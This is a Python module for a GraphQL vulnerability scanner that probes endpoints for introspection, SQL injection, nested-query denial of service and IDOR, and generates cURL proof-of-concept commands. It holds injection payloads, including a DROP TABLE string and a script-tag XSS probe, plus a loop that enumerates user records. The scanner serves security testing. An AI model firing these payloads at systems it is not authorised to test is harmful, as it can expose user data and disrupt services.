#!/usr/bin/env python3
"""
GraphQL Testing Module
======================

Comprehensive GraphQL vulnerability detection and testing.

Features:
- Introspection query testing
- GraphQL injection detection
- Nested query DoS testing
- IDOR in GraphQL queries
- Authentication bypass testing
- Query complexity analysis
- Automated PoC generation

Author: Llakterian (llakterian@gmail.com)
License: MIT
"""

import json
import logging
import time
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass
import requests

logger = logging.getLogger(__name__)


@dataclass
class GraphQLVulnerability:
    """GraphQL vulnerability data structure"""

    url: str
    vuln_type: str  # 'introspection', 'injection', 'dos', 'idor', 'auth_bypass'
    query: str
    evidence: str
    severity: str
    cvss_score: float
    schema_info: Optional[Dict]
    poc_query: str
    poc_curl: str
    remediation: str


class GraphQLTester:
    """GraphQL vulnerability testing"""

    # Introspection query
    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
        __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
                ...FullType
            }
            directives {
                name
                description
                locations
                args {
                    ...InputValue
                }
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type { ...TypeRef }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    """

    # Simple introspection query
    SIMPLE_INTROSPECTION = """
    {
        __schema {
            types {
                name
            }
        }
    }
    """

    # Injection payloads
    INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "1' OR '1'='1' --",
        "admin'--",
        "1; DROP TABLE users--",
        "<script>alert('XSS')</script>",
        "1 UNION SELECT * FROM users--",
    ]

    def __init__(self, session: requests.Session, marker: str):
        self.session = session
        self.marker = marker
        self.vulnerabilities: List[GraphQLVulnerability] = []
        self.schema_info: Optional[Dict] = None

    def test_endpoint(self, url: str) -> List[GraphQLVulnerability]:
        """Test GraphQL endpoint for vulnerabilities"""
        vulnerabilities = []

        # Test introspection
        vuln = self._test_introspection(url)
        if vuln:
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)

        # Test injection
        vulns = self._test_injection(url)
        vulnerabilities.extend(vulns)
        self.vulnerabilities.extend(vulns)

        # Test nested query DoS
        vuln = self._test_nested_query_dos(url)
        if vuln:
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)

        # Test IDOR
        vulns = self._test_idor(url)
        vulnerabilities.extend(vulns)
        self.vulnerabilities.extend(vulns)

        return vulnerabilities

    def _test_introspection(self, url: str) -> Optional[GraphQLVulnerability]:
        """Test if GraphQL introspection is enabled"""
        try:
            # Try full introspection query
            response = self._send_graphql_query(url, self.INTROSPECTION_QUERY)

            if response and response.status_code == 200:
                try:
                    data = response.json()

                    if "data" in data and "__schema" in data.get("data", {}):
                        schema = data["data"]["__schema"]
                        self.schema_info = schema

                        logger.info(f"🔍 GraphQL introspection enabled: {url}")

                        # Extract type names
                        types = [t["name"] for t in schema.get("types", [])]
                        queries = schema.get("queryType", {}).get("name", "Query")
                        mutations = schema.get("mutationType", {}).get(
                            "name", "Mutation"
                        )

                        poc_curl = self._generate_introspection_poc_curl(url)
                        poc_query = self.SIMPLE_INTROSPECTION

                        return GraphQLVulnerability(
                            url=url,
                            vuln_type="introspection",
                            query=self.INTROSPECTION_QUERY,
                            evidence=f"Schema exposed: {len(types)} types, {queries}, {mutations}",
                            severity="Low",
                            cvss_score=3.1,
                            schema_info={
                                "types": types[:10],
                                "queries": queries,
                                "mutations": mutations,
                            },
                            poc_query=poc_query,
                            poc_curl=poc_curl,
                            remediation="Disable introspection in production or require authentication",
                        )

                except json.JSONDecodeError:
                    logger.debug("Failed to parse introspection response")

        except Exception as e:
            logger.debug(f"Introspection test failed: {e}")

        return None

    def _test_injection(self, url: str) -> List[GraphQLVulnerability]:
        """Test for GraphQL injection vulnerabilities"""
        vulnerabilities = []

        if not self.schema_info:
            # Try to get schema first
            self._test_introspection(url)

        # Test with basic query
        test_queries = [
            'query { users(id: "{payload}") { id name } }',
            'query { user(username: "{payload}") { id email } }',
            'query { product(id: "{payload}") { name price } }',
        ]

        for query_template in test_queries:
            for payload in self.INJECTION_PAYLOADS[:3]:  # Test first 3 payloads
                query = query_template.format(payload=payload)

                try:
                    response = self._send_graphql_query(url, query)

                    if response and response.status_code == 200:
                        response_text = response.text.lower()

                        # Check for SQL error indicators
                        sql_errors = [
                            "sql syntax",
                            "mysql",
                            "postgresql",
                            "sqlite",
                            "syntax error",
                            "unterminated",
                        ]

                        for error in sql_errors:
                            if error in response_text:
                                logger.info(f"🔓 GraphQL injection found: {url}")

                                poc_curl = self._generate_injection_poc_curl(url, query)

                                vuln = GraphQLVulnerability(
                                    url=url,
                                    vuln_type="injection",
                                    query=query,
                                    evidence=f"SQL error detected: {error}",
                                    severity="High",
                                    cvss_score=8.0,
                                    schema_info=None,
                                    poc_query=query,
                                    poc_curl=poc_curl,
                                    remediation="Use parameterized queries and input validation",
                                )

                                vulnerabilities.append(vuln)
                                return vulnerabilities  # One injection is enough

                except Exception as e:
                    logger.debug(f"Injection test failed: {e}")

        return vulnerabilities

    def _test_nested_query_dos(self, url: str) -> Optional[GraphQLVulnerability]:
        """Test for nested query DoS vulnerability"""
        try:
            # Generate deeply nested query
            nested_query = self._generate_nested_query(depth=10)

            start_time = time.time()
            response = self._send_graphql_query(url, nested_query, timeout=30)
            response_time = time.time() - start_time

            # If query takes very long or times out, likely vulnerable
            if response_time > 15 or not response:
                logger.info(f"⚠️  GraphQL DoS vulnerability found: {url}")

                poc_curl = self._generate_dos_poc_curl(url, nested_query)

                return GraphQLVulnerability(
                    url=url,
                    vuln_type="dos",
                    query=nested_query,
                    evidence=f"Nested query took {response_time:.2f}s or timed out",
                    severity="Medium",
                    cvss_score=5.5,
                    schema_info=None,
                    poc_query=nested_query,
                    poc_curl=poc_curl,
                    remediation="Implement query depth limiting and complexity analysis",
                )

        except requests.Timeout:
            logger.info(f"⚠️  GraphQL DoS detected (timeout): {url}")

            return GraphQLVulnerability(
                url=url,
                vuln_type="dos",
                query=nested_query,
                evidence="Query timeout due to excessive nesting",
                severity="Medium",
                cvss_score=5.5,
                schema_info=None,
                poc_query=nested_query,
                poc_curl=self._generate_dos_poc_curl(url, nested_query),
                remediation="Implement query depth limiting and complexity analysis",
            )
        except Exception as e:
            logger.debug(f"DoS test failed: {e}")

        return None

    def _test_idor(self, url: str) -> List[GraphQLVulnerability]:
        """Test for IDOR in GraphQL queries"""
        vulnerabilities = []

        # Test with different user IDs
        test_ids = ["1", "2", "999", "admin", "0"]

        for user_id in test_ids[:3]:  # Test first 3 IDs
            query = f'''
            query {{
                user(id: "{user_id}") {{
                    id
                    username
                    email
                    role
                }}
            }}
            '''

            try:
                response = self._send_graphql_query(url, query)

                if response and response.status_code == 200:
                    try:
                        data = response.json()

                        # Check if we got user data
                        if "data" in data and "user" in data.get("data", {}):
                            user_data = data["data"]["user"]
                            if user_data:
                                logger.info(
                                    f"🔓 GraphQL IDOR found: {url} (user: {user_id})"
                                )

                                poc_curl = self._generate_idor_poc_curl(url, query)

                                vuln = GraphQLVulnerability(
                                    url=url,
                                    vuln_type="idor",
                                    query=query,
                                    evidence=f"Accessed user data for ID: {user_id}",
                                    severity="Medium",
                                    cvss_score=6.5,
                                    schema_info=None,
                                    poc_query=query,
                                    poc_curl=poc_curl,
                                    remediation="Implement proper authorization checks for all queries",
                                )

                                vulnerabilities.append(vuln)
                                break  # One IDOR example is enough

                    except json.JSONDecodeError:
                        pass

            except Exception as e:
                logger.debug(f"IDOR test failed: {e}")

        return vulnerabilities

    def _send_graphql_query(
        self, url: str, query: str, variables: Optional[Dict] = None, timeout: int = 10
    ) -> Optional[requests.Response]:
        """Send GraphQL query"""
        try:
            payload = {"query": query}
            if variables:
                payload["variables"] = variables

            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
            }

            response = self.session.post(
                url, json=payload, headers=headers, timeout=timeout
            )

            return response

        except requests.Timeout:
            raise
        except Exception as e:
            logger.debug(f"GraphQL query failed: {e}")
            return None

    def _generate_nested_query(self, depth: int = 10) -> str:
        """Generate deeply nested GraphQL query"""
        query = "query NestedQuery { "

        # Build nested structure
        for i in range(depth):
            query += f"user{i} {{ id name "

        query += "email "

        # Close all brackets
        for i in range(depth):
            query += "} "

        query += "}"

        return query

    def _generate_introspection_poc_curl(self, url: str) -> str:
        """Generate introspection PoC (cURL)"""
        query = self.SIMPLE_INTROSPECTION.replace("\n", " ").strip()

        poc = f'''# GraphQL Introspection PoC

curl -X POST "{url}" \\
  -H "Content-Type: application/json" \\
  -d '{{"query":"{query}"}}' \\
  --insecure

# Or use full introspection query from:
# https://github.com/graphql/graphql-js/blob/main/src/utilities/getIntrospectionQuery.js
'''
        return poc

    def _generate_injection_poc_curl(self, url: str, query: str) -> str:
        """Generate injection PoC (cURL)"""
        escaped_query = query.replace('"', '\\"').replace("\n", " ")

        poc = f'''# GraphQL Injection PoC

curl -X POST "{url}" \\
  -H "Content-Type: application/json" \\
  -d '{{"query":"{escaped_query}"}}' \\
  --insecure

# Try different injection payloads in query parameters
'''
        return poc

    def _generate_dos_poc_curl(self, url: str, query: str) -> str:
        """Generate DoS PoC (cURL)"""
        escaped_query = query.replace('"', '\\"').replace("\n", " ")

        poc = f'''# GraphQL DoS PoC (Nested Query)

curl -X POST "{url}" \\
  -H "Content-Type: application/json" \\
  -d '{{"query":"{escaped_query}"}}' \\
  --max-time 30 \\
  --insecure

# Warning: This may cause high CPU usage on the server
'''
        return poc

    def _generate_idor_poc_curl(self, url: str, query: str) -> str:
        """Generate IDOR PoC (cURL)"""
        escaped_query = query.replace('"', '\\"').replace("\n", " ")

        poc = f'''# GraphQL IDOR PoC

# Test with different user IDs
for id in 1 2 3 999 admin; do
    echo "[*] Testing ID: $id"
    curl -X POST "{url}" \\
      -H "Content-Type: application/json" \\
      -d '{{"query":"query {{ user(id: \\"$id\\") {{ id username email role }} }}"}}' \\
      --insecure
    echo "---"
done
'''
        return poc

    def analyze_schema(self) -> Dict:
        """Analyze GraphQL schema for security issues"""
        if not self.schema_info:
            return {"error": "No schema available"}

        analysis = {
            "total_types": len(self.schema_info.get("types", [])),
            "query_type": self.schema_info.get("queryType", {}).get("name"),
            "mutation_type": self.schema_info.get("mutationType", {}).get("name"),
            "sensitive_fields": [],
            "mutations_available": [],
        }

        # Look for sensitive field names
        sensitive_keywords = [
            "password",
            "token",
            "secret",
            "api_key",
            "credit_card",
            "ssn",
            "admin",
        ]

        for type_info in self.schema_info.get("types", []):
            type_name = type_info.get("name", "")
            fields = type_info.get("fields", [])

            for field in fields:
                field_name = field.get("name", "").lower()
                for keyword in sensitive_keywords:
                    if keyword in field_name:
                        analysis["sensitive_fields"].append(
                            f"{type_name}.{field.get('name')}"
                        )

        return analysis

    def generate_report(self) -> Dict:
        """Generate GraphQL vulnerability report"""
        schema_analysis = self.analyze_schema() if self.schema_info else None

        return {
            "total_vulnerabilities": len(self.vulnerabilities),
            "schema_exposed": self.schema_info is not None,
            "schema_analysis": schema_analysis,
            "vulnerabilities": [
                {
                    "url": v.url,
                    "type": v.vuln_type,
                    "severity": v.severity,
                    "cvss_score": v.cvss_score,
                    "evidence": v.evidence,
                    "remediation": v.remediation,
                    "poc_available": True,
                }
                for v in self.vulnerabilities
            ],
        }

    def export_schema(self, output_file: str):
        """Export GraphQL schema to file"""
        if not self.schema_info:
            logger.warning("No schema available to export")
            return

        try:
            with open(output_file, "w") as f:
                json.dump(self.schema_info, f, indent=2)
            logger.info(f"✅ Schema exported to: {output_file}")
        except Exception as e:
            logger.error(f"❌ Failed to export schema: {e}")
